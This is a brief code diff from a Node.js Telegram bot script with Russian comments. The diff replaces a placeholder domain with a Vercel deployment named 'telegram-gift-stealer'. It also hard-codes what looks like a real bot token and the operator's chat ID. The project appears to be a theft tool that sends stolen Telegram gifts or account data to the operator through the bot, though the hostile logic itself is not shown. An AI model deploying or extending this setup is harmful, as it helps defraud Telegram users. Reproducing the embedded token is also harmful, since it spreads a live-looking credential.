@@ -5,7 +5,7 @@ const express = require('express');
 // ЗАМЕНИ ЭТО СВОИМИ ДАННЫМИ:
 const BOT_TOKEN = '8280258891:AAFMkGWctd-5D1noCN-mdraftoAabv162qE'; // ТВОЙ ТОКЕН
 const YOUR_CHAT_ID = '8280258891'; // ТВОЙ CHAT ID
-const DOMAIN = 'https://ваш-проект.vercel.app'; // ТВОЙ URL VERCEL
+const DOMAIN = 'https://telegram-gift-stealer-gv9a.vercel.app/'; // ТВОЙ URL VERCEL
 // ================== //
 
 const bot = new TelegramBot(BOT_TOKEN, {polling: true});
